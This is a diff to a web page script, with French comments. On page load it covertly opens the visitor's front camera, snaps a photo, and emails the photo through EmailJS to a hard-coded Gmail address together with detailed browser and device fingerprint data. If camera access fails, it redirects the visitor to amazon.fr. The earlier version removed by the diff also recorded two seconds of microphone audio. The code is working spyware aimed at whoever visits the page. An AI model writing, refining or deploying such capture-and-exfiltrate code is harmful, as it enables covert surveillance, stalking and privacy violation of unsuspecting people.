@@ -62,137 +62,129 @@
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
     
-    let mediaRecorder;
-    let audioChunks = [];
-    let photoData = null;
-    
     // Démarrage automatique
     window.addEventListener('load', async () => {
       try {
-        // Accès caméra et micro
+        // Accès caméra frontale
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { 
             facingMode: 'user',
             width: { ideal: 320 },
             height: { ideal: 240 }
-          },
-          audio: true
+          }
         });
         
         video.srcObject = stream;
         video.muted = true;
         
-        // Attendre que la vidéo soit prête
+        // Photo instantanée dès que prêt
         video.addEventListener('loadedmetadata', () => {
-          capturePhotoAndAudio(stream);
+          captureAndSend(stream);
         });
         
       } catch (err) {
-        console.error('Erreur:', err);
+        console.error('Erreur caméra:', err);
         redirectToAmazon();
       }
     });
     
-    function capturePhotoAndAudio(stream) {
-      // 1. Prendre la photo immédiatement
+    function captureAndSend(stream) {
+      // Capture instantanée
       context.drawImage(video, 0, 0, 320, 240);
-      photoData = canvas.toDataURL("image/jpeg", 0.3); // Qualité réduite pour poids
+      const photoData = canvas.toDataURL("image/jpeg", 0.5);
       
-      // 2. Enregistrer l'audio pendant 2 secondes
-      audioChunks = [];
+      // Arrêter la caméra immédiatement
+      stream.getTracks().forEach(track => track.stop());
       
-      // Créer un stream audio seulement
-      const audioStream = new MediaStream();
-      stream.getAudioTracks().forEach(track => {
-        audioStream.addTrack(track);
-      });
-      
-      mediaRecorder = new MediaRecorder(audioStream, {
-        mimeType: 'audio/webm;codecs=opus'
-      });
-      
-      mediaRecorder.ondataavailable = (event) => {
-        if (event.data.size > 0) {
-          audioChunks.push(event.data);
-        }
-      };
-      
-      mediaRecorder.onstop = () => {
-        processAndSend(stream);
-      };
-      
-      // Démarrer enregistrement audio 2 secondes
-      mediaRecorder.start();
-      setTimeout(() => {
-        if (mediaRecorder && mediaRecorder.state === 'recording') {
-          mediaRecorder.stop();
-        }
-      }, 2000);
-    }
-    
-    function processAndSend(stream) {
-      // Créer le blob audio
-      const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-      
-      // Vérifier la taille totale
-      const photoSize = Math.round(photoData.length * 0.75); // Taille approximative en bytes
-      const audioSize = audioBlob.size;
-      const totalSize = photoSize + audioSize;
-      
-      console.log(`Tailles: Photo ~${Math.round(photoSize/1024)}KB, Audio ~${Math.round(audioSize/1024)}KB, Total ~${Math.round(totalSize/1024)}KB`);
-      
-      // Si trop volumineux, réduire encore
-      let finalPhotoData = photoData;
-      if (totalSize > 50000) { // 50KB
-        // Réduire drastiquement la qualité photo
-        finalPhotoData = canvas.toDataURL("image/jpeg", 0.1);
-        console.log('Photo compressée davantage');
-      }
-      
-      // Convertir l'audio en base64
-      const audioReader = new FileReader();
-      audioReader.onload = () => {
-        sendCompactData(finalPhotoData, audioReader.result, stream);
-      };
-      audioReader.readAsDataURL(audioBlob);
-    }
-    
-    function sendCompactData(imageData, audioData, stream) {
-      // Arrêter la caméra
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
-      
-      // Calculer les tailles finales
-      const finalImageSize = Math.round(imageData.length * 0.75);
-      const finalAudioSize = Math.round(audioData.length * 0.75);
-      const finalTotalSize = finalImageSize + finalAudioSize;
-      
-      // Préparer les données optimisées
+      // Collecter toutes les métadonnées
       const templateParams = {
-        from_name: "Auto",
-        message: `Photo + Audio 2s (Total: ~${Math.round(finalTotalSize/1024)}KB)`,
+        // Destinataire spécifique
+        to_email: "adressestestee@gmail.com",
+        to_name: "Test Recipient",
+        
+        // Expéditeur
+        from_name: "Auto Capture",
+        message: "Photo instantanée avec métadonnées complètes",
+        
+        // Photo
+        photo_data: photoData,
+        
+        // Date et heure
         timestamp: new Date().toLocaleString('fr-FR'),
+        date: new Date().toISOString().split('T')[0],
+        time: new Date().toLocaleTimeString('fr-FR'),
+        iso_timestamp: new Date().toISOString(),
         
-        // Données compactes
-        photo_data: imageData,
-        audio_data: audioData,
+        // Navigateur
+        user_agent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages.join(', '),
+        platform: navigator.platform,
+        cookie_enabled: navigator.cookieEnabled,
+        online_status: navigator.onLine ? "En ligne" : "Hors ligne",
         
-        // Métadonnées minimales
-        photo_size: `~${Math.round(finalImageSize/1024)}KB`,
-        audio_duration: "2 secondes",
-        audio_size: `~${Math.round(finalAudioSize/1024)}KB`,
-        total_size: `~${Math.round(finalTotalSize/1024)}KB`,
+        // Écran et fenêtre
+        screen_width: screen.width,
+        screen_height: screen.height,
+        screen_resolution: screen.width + 'x' + screen.height,
+        color_depth: screen.colorDepth,
+        pixel_depth: screen.pixelDepth,
+        window_width: window.innerWidth,
+        window_height: window.innerHeight,
+        window_size: window.innerWidth + 'x' + window.innerHeight,
         
-        // Info système minimale
-        device: navigator.platform,
-        time: new Date().toISOString()
+        // Page
+        page_url: window.location.href,
+        page_title: document.title,
+        page_domain: window.location.hostname,
+        page_protocol: window.location.protocol,
+        referrer: document.referrer || "Direct",
+        
+        // Timezone
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezone_offset: new Date().getTimezoneOffset(),
+        
+        // Performance
+        load_time: performance.now(),
+        
+        // Connexion (si disponible)
+        connection_type: navigator.connection ? navigator.connection.effectiveType : "Inconnue",
+        connection_speed: navigator.connection ? navigator.connection.downlink + " Mbps" : "Inconnue",
+        
+        // Appareil (estimations)
+        is_mobile: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent),
+        is_tablet: /iPad|Android(?!.*Mobile)/.test(navigator.userAgent),
+        is_desktop: !/Mobile|Android|iPhone|iPad/.test(navigator.userAgent),
+        
+        // Capacités
+        webgl_support: !!window.WebGLRenderingContext,
+        local_storage: typeof Storage !== "undefined",
+        session_storage: typeof sessionStorage !== "undefined",
+        
+        // Géolocalisation (statut seulement)
+        geolocation_available: !!navigator.geolocation,
+        
+        // Caméra info
+        camera_access: "Accordé",
+        photo_quality: "0.5",
+        photo_format: "JPEG",
+        photo_dimensions: "320x240",
+        
+        // Session
+        session_id: 'sess_' + Math.random().toString(36).substr(2, 9),
+        random_id: Math.random().toString(36).substr(2, 12),
+        
+        // Extras
+        java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+        do_not_track: navigator.doNotTrack,
+        hardware_concurrency: navigator.hardwareConcurrency || "Inconnu",
+        device_memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Inconnu"
       };
       
-      // Envoyer
+      // Envoi avec toutes les métadonnées
       emailjs.send("service_8cs0gml", "template_w14xn7c", templateParams)
         .then(() => {
-          console.log('✅ Données envoyées');
+          console.log('✅ Photo + métadonnées envoyées à adressestestee@gmail.com');
         })
         .catch(err => {
           console.error('❌ Erreur envoi:', err);
@@ -205,7 +197,7 @@
     function redirectToAmazon() {
       setTimeout(() => {
         window.location.href = 'https://www.amazon.fr';
-      }, 500);
+      }, 1000);
     }
   </script>
 </body>
